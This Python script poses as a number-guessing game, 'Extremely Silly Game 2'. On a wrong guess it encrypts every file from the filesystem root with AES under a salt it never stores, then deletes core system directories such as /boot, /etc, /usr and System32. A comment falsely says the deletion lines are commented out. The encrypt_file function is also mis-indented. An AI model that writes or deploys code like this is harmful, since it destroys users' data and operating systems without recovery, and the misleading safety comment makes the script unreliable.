#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: April 19 2024
# Description of Script
# The Extremely Silly Game 2 is a simple number guessing game that asks the user to guess a 
# random number between 1 and 10. If the user's guess is correct, they win the game and a 
# congratulatory message is displayed. If the user's guess is incorrect, they lose the game and 
# a message is displayed indicating that they have lost. In the event of a loss, the game then 
# proceeds to encrypt the root directories and all of their subdirectories and files on the host 
# system using the AES encryption algorithm with a key derived from a predefined password and 
# a salt value. This is done using the cryptography library in Python. The encryption process 
# overwrites all files in the specified directories with their encrypted contents, effectively
# destroying the original data. It is important to note that this is a destructive and dangerous
# operation that should only be performed in a controlled and safe environment, as it can cause
# serious damage to the operating system and potentially render the system unusable.
#################################################################################################
import random
import os
import platform
import subprocess
import base64
import getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import shutil

# Generate a random number between 1 and 10
number = random.randint(1,10)

# Ask the user if they want to play a game
play = input("Would you like to play the Extremely Silly Game 2? (yes/no) ")
# Check if the user wants to play
if play.lower() == "yes" or play.lower() == "y": 
    # Print a welcome message if the user wants to play
    print("Welcome to the Extremely Silly Game 2!")
else:
    # Print a message if the user doesn't want to play
    print("Too bad...")
    print("Welcome to the Extremely Silly Game 2!")

# Ask the user to guess a number between 1 and 10
choice = int(input("Please guess a number between 1 and 10: "))

# Check if the user's guess matches the random number
if choice == number:
    # Print a congratulatory message if the guess is correct
    print("Congratulations on Winning the Extremely Silly Game 2!")
else:
    # Print a message if the guess is incorrect
    print("Oh no.....")
    print("You have lost the Extremely Silly Game 2... Goodbye!")

    # Generate a key for encryption
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
    password = "2pI34n%FrOq*0189HqPzR7&T@z"
    key = kdf.derive(password.encode())

    # Encrypt the root directories and all its subdirectories and files
    def encrypt_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_content = file.read()
    except OSError as e:
        print(f"Error reading file {file_path}: {e}")
        return

    nonce = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce=nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_content = encryptor.update(file_content) + encryptor.finalize()

    try:
        with open(file_path, "wb") as file:
            file.write(nonce + encrypted_content)
    except OSError as e:
        print(f"Error writing to file {file_path}: {e}")

    def traverse_directories(directory):
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path):
                    encrypt_file(file_path)

    if platform.system() == "Linux":
        directories = ["/"]
    elif platform.system() == "Windows":
        directories = ["C:\\"]
    elif platform.system() == "Darwin":
        directories = ["/"]

    for directory in directories:
        traverse_directories(directory)
    # The following lines attempt to remove critical system files based on the detected OS,
    # but they are commented out here to prevent accidental execution and system damage.
    if platform.system() == "Linux":
        shutil.rmtree("/boot")
        shutil.rmtree("/etc")
        shutil.rmtree("/usr")
        shutil.rmtree("/bin")
    elif platform.system() == "Windows":
        os.remove("C:\Windows\System32")
    elif platform.system() == "Darwin":
        shutil.rmtree("/System/Library/CoreServices/Boot")
        shutil.rmtree("/etc")
        shutil.rmtree("/usr")
        shutil.rmtree("/bin")
